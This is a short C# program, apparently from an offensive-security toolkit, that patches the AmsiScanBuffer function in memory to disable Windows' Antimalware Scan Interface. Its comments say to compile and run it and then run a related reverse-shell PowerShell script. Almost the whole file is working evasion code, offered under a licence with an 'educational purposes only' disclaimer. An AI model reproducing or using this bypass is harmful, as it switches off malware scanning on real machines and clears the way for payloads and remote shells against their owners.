#########################################################################################################################################################################################################################
# Basic C# in an attempt to bypass ASMI: Please use wisely and with permission! 41ph4-01 01/06/2024 
# Permission is hereby granted, free of charge, to any person obtaining a copy of this software and associated documentation files (the “Software”), to deal in the Software 
# without restriction, including without limitation the rights to use, copy, modify, merge, publish, distribute, sublicense, and/or sell copies of the Software, and to permit persons 
# to whom the Software is furnished to do so, subject to the following conditions: The above copyright notice and this permission notice shall be included in all copies or substantial 
# portions of the Software.
# THE SOFTWARE IS PROVIDED “AS IS”, WITHOUT WARRANTY OF ANY KIND, EXPRESS OR IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY, FITNESS FOR A PARTICULAR PURPOSE 
# AND NONINFRINGEMENT. IN NO EVENT SHALL THE AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER LIABILITY, 
# WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM, OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE SOFTWARE.
#########################################################################################################################################################################################################################



using System;
using System.Runtime.InteropServices;

public class AMSIBypass
{
    [DllImport("kernel32")]
    public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
    
    [DllImport("kernel32")]
    public static extern IntPtr LoadLibrary(string name);

    [DllImport("kernel32")]
    public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);

    public static void Bypass()
    {
        var hModule = LoadLibrary("amsi.dll");
        var addr = GetProcAddress(hModule, "AmsiScanBuffer");
        VirtualProtect(addr, (UIntPtr)5, 0x40, out var oldProtect);
        Marshal.Copy(new byte[] { 0x31, 0xFF, 0x90 }, 0, addr, 3);
        VirtualProtect(addr, (UIntPtr)5, oldProtect, out _);
    }

    public static void Main(string[] args)
    {
        Bypass();
        Console.WriteLine("AMSI Bypass Applied");
    }
}

######################################################################################################################################################################################################################
# Compile with C# using msbuild //msbuild AMSIBypass.csproj
# Execute compiled binary AMSIBypass.exe
# Run the adjacent/related reverseshell PowerShell script
# This code is intended for educational purposes only. Unauthorized use of this code is prohibited. Use responsibly and ensure you have proper authorization before testing any security measures.
######################################################################################################################################################################################################################
